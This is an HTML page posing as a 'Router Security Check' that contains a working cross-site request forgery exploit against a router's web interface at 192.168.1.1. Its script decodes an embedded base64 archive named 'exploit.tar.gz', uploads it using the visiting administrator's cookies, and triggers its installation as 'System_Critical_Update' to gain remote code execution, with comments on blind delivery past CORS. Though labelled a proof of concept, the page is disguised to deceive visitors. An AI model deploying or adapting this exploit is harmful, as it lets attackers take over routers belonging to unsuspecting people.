
<!DOCTYPE html>
<html>
<head>
    <title>Router Security Check</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 50px; }
        .status { margin: 20px; padding: 10px; border: 1px solid #ccc; background: #f9f9f9; }
    </style>
</head>
<body>
    <h1>Wait for system check...</h1>
    <div id="log" class="status">Initializing...</div>

    <script>
        var target = "http://192.168.1.1";
        
        function log(msg) {
            document.getElementById("log").innerText += "\n" + msg;
            console.log(msg);
        }

        // 1. 将 Base64 还原为二进制 Blob
        var b64Data = "H4sICFqyMWkC/2V4cGxvaXQudGFyAO3VPU+DQADG8Zv5FGec5V44uA7VOIhpB2vTNHFsTiABLWDgqI3G7y6tQ02T1qmYts9v6BEgYXr6d5nLbsdmOUhMnFTkIPiPXSfnntpcr+4LLoUkdEk60NTWVO3nyXmSPZrbLE+uhQ5UL1ABl67yAp8LzyFw8t6zD1PFV1VTHO4bq1EHar1xoX3++1wTQhHht7+eJ4Qn2/3L9iSUd7n/yMzLff9/fz0/UpcX7DkrWJ06tmyilDKbv7Hx0yi8m91PHh9mw9E0nIzCqROleRlTrfXuV7Cm4+Oi/+g/+n/m/XdTm8//rf+r/W/1X/o++t+FfipuBiZ6TWK6yAwdFjapisT2WXsf60D/0X/0H07Xwsyz2Niycl/qsjjc/vf2n8vt/msl0f8ufH5hAwAAAAAAAAAAp+wbVn7dSQAoAAA=";
        var byteCharacters = atob(b64Data);
        var byteNumbers = new Array(byteCharacters.length);
        for (var i = 0; i < byteCharacters.length; i++) {
            byteNumbers[i] = byteCharacters.charCodeAt(i);
        }
        var byteArray = new Uint8Array(byteNumbers);
        var blob = new Blob([byteArray], {type: 'application/x-gzip'});

        // 2. 构造上传表单
        var formData = new FormData();
        formData.append("qqfile", blob, "exploit.tar.gz");

        log("[*] Step 1: Sending CSRF Upload to " + target + "...");

        // 3. 发送上传请求 (AJAX)
        // 关键：withCredentials = true 让浏览器带上管理员的 Cookie
        var xhr = new XMLHttpRequest();
        xhr.open("POST", target + "/api/wizard/upload.json", true);
        xhr.withCredentials = true;

        xhr.onload = function () {
            if (xhr.status === 200) {
                log("[+] Upload Success! Response received.");
                try {
                    var resp = JSON.parse(xhr.responseText);
                    if (resp.success) {
                        var path = resp.path;
                        log("[+] Path retrieved: " + path);
                        triggerInstall(path);
                    } else {
                        log("[-] Upload succeeded but returned error: " + xhr.responseText);
                    }
                } catch (e) {
                    log("[-] Could not parse JSON. Detailed error: " + e);
                }
            } else {
                log("[-] Upload failed. Status: " + xhr.status);
            }
        };

        xhr.onerror = function () {
            // 如果是因为 CORS 跨域被拦截，无法读取返回值，会进到这里
            log("[!] Network Error / CORS Blocked.");
            log("[*] IMPORTANT: Even if blocked, check /tmp on router via SSH!");
            log("[*] The browser might have sent the request (Blind CSRF) but blocked reading the response.");
        };

        xhr.send(formData);

        function triggerInstall(path) {
            log("[*] Step 2: Triggering RCE Install...");
            var xhr2 = new XMLHttpRequest();
            xhr2.open("POST", target + "/api/wizard/create.json", true);
            xhr2.withCredentials = true;
            
            var formData2 = new FormData();
            formData2.append("name", "System_Critical_Update");
            formData2.append("path", path);

            xhr2.onload = function() {
                if (xhr2.status === 200 && xhr2.responseText.includes("success")) {
                    log("[!!!] RCE TRIGGERED SUCCESSFULLY!");
                    alert("PoC Successful! Check Router /tmp folder.");
                } else {
                    log("[-] Install failed: " + xhr2.responseText);
                }
            };
            xhr2.send(formData2);
        }
    </script>
</body>
</html>
    
